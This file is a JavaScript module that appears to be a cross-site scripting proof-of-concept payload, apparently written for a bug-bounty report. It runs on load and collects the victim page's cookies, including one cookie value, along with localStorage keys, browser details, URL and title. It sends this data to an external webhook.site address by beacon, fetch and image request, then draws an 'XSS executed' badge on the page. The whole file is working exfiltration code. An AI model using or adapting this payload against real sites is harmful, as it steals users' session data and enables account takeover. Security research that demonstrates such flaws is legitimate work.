define([], function () {
  var WEBHOOK_URL = "https://webhook.site/fb9555c7-cb50-4b63-bc1b-1d9befffd87b";
  var COOKIE_ALLOWLIST = [
    "_ga",
    "_gid",
    "_gat",
    "OptanonConsent",
    "OptanonAlertBoxClosed",
    "cookieconsent_status",
    "cookie_consent",
    "ak_bmsc",
    "bm_sv",
    "AMCV"
  ];

  function nowIso() {
    return new Date().toISOString();
  }

  function safeCall(fn, fallback) {
    try {
      return fn();
    } catch (e) {
      return fallback;
    }
  }

  function parseCookies() {
    var raw = safeCall(function () {
      return document.cookie || "";
    }, "");
    if (!raw) {
      return [];
    }
    return raw
      .split(";")
      .map(function (part) {
        var t = part.trim();
        var eq = t.indexOf("=");
        if (eq < 0) {
          return { name: t, value: "" };
        }
        return {
          name: t.slice(0, eq),
          value: t.slice(eq + 1)
        };
      })
      .filter(function (c) { return c.name; });
  }

  function pickLowRiskCookie(parsedCookies) {
    var i;
    for (i = 0; i < COOKIE_ALLOWLIST.length; i++) {
      var wanted = COOKIE_ALLOWLIST[i].toLowerCase();
      for (var j = 0; j < parsedCookies.length; j++) {
        if ((parsedCookies[j].name || "").toLowerCase().indexOf(wanted) !== -1) {
          return parsedCookies[j];
        }
      }
    }
    return parsedCookies.length ? parsedCookies[0] : null;
  }

  function collectNavigatorLite() {
    var n = window.navigator || {};
    return {
      userAgent: n.userAgent,
      language: n.language,
      languages: safeCall(function () { return (n.languages || []).slice(0, 5); }, []),
      platform: n.platform,
      cookieEnabled: n.cookieEnabled
    };
  }

  function sendPayload(payload) {
    var serialized = safeCall(function () { return JSON.stringify(payload); }, "{}");
    var delivery = {
      beacon: null,
      fetchStarted: false,
      imageFallback: false
    };

    try {
      if (navigator.sendBeacon) {
        delivery.beacon = navigator.sendBeacon(
          WEBHOOK_URL,
          new Blob([serialized], { type: "text/plain;charset=UTF-8" })
        );
      }
    } catch (e) {
      delivery.beacon = "error:" + (e && e.message ? e.message : String(e));
    }

    try {
      if (window.fetch) {
        fetch(WEBHOOK_URL, {
          method: "POST",
          mode: "no-cors",
          credentials: "omit",
          keepalive: true,
          headers: { "content-type": "text/plain;charset=UTF-8" },
          body: serialized
        }).catch(function () {});
        delivery.fetchStarted = true;
      }
    } catch (e) {
      delivery.fetchStarted = "error:" + (e && e.message ? e.message : String(e));
    }

    // Single GET fallback for environments where beacon/fetch are filtered.
    try {
      var p = payload || {};
      var m = p.marker || {};
      var c = p.selectedCookieProof || {};
      var qs = [
        "event=" + encodeURIComponent(p.event || "cp_hash_loader_xss_exec_proof"),
        "ts=" + encodeURIComponent(m.ts || nowIso()),
        "origin=" + encodeURIComponent(m.victimOrigin || window.location.origin),
        "href=" + encodeURIComponent(m.victimHref || window.location.href),
        "domain=" + encodeURIComponent(m.documentDomain || document.domain || ""),
        "cookie_name=" + encodeURIComponent(c.name || ""),
        "cookie_value=" + encodeURIComponent(c.value || ""),
        "cookie_count=" + encodeURIComponent(String(p.cookieCount || 0)),
        "title=" + encodeURIComponent(p.title || "")
      ].join("&");

      var img = new Image();
      img.referrerPolicy = "no-referrer";
      img.src = WEBHOOK_URL + "?" + qs;
      delivery.imageFallback = true;
      delivery.imageUrl = img.src;
      window.__CP_POC_LAST_IMG_URL__ = img.src;
    } catch (e) {
      delivery.imageFallback = "error:" + (e && e.message ? e.message : String(e));
    }

    window.__CP_POC_DELIVERY__ = delivery;
  }

  function markVisualProof(ts) {
    var id = "cp-xss-proof-badge";
    if (document.getElementById(id)) {
      return;
    }
    var badge = document.createElement("div");
    badge.id = id;
    badge.textContent = "XSS executed at " + ts + " on " + window.location.origin;
    badge.style.position = "fixed";
    badge.style.right = "16px";
    badge.style.bottom = "16px";
    badge.style.padding = "10px 14px";
    badge.style.background = "#111";
    badge.style.color = "#00ff90";
    badge.style.font = "12px monospace";
    badge.style.zIndex = "2147483647";
    badge.style.border = "1px solid #00ff90";
    badge.style.borderRadius = "6px";
    document.documentElement.appendChild(badge);
  }

  function executePoC() {
    var ts = nowIso();
    var cookies = parseCookies();
    var chosen = pickLowRiskCookie(cookies);
    var localStorageKeys = safeCall(function () {
      var keys = [];
      for (var i = 0; i < localStorage.length && i < 30; i++) {
        keys.push(localStorage.key(i));
      }
      return keys;
    }, []);

    var marker = {
      executed: true,
      ts: ts,
      origin: window.location.origin,
      href: window.location.href
    };
    window.__CP_POC_MARKER__ = marker;
    safeCall(function () {
      localStorage.setItem("cp_poc_marker", JSON.stringify(marker));
    }, null);

    var payload = {
      event: "cp_hash_loader_xss_exec_proof",
      marker: {
        executed: true,
        ts: ts,
        victimOrigin: window.location.origin,
        victimHref: window.location.href,
        documentDomain: document.domain
      },
      selectedCookieProof: chosen,
      cookieNames: cookies.map(function (c) { return c.name; }).slice(0, 30),
      cookieCount: cookies.length,
      localStorageKeyCount: safeCall(function () { return localStorage.length; }, 0),
      localStorageKeys: localStorageKeys,
      navigator: collectNavigatorLite(),
      referrer: document.referrer || "",
      title: document.title || ""
    };

    markVisualProof(ts);
    sendPayload(payload);
    return marker;
  }

  executePoC();

  return {
    version: "102.0.0-single-post-plus-image-fallback",
    render: function () {
      return executePoC();
    }
  };
});
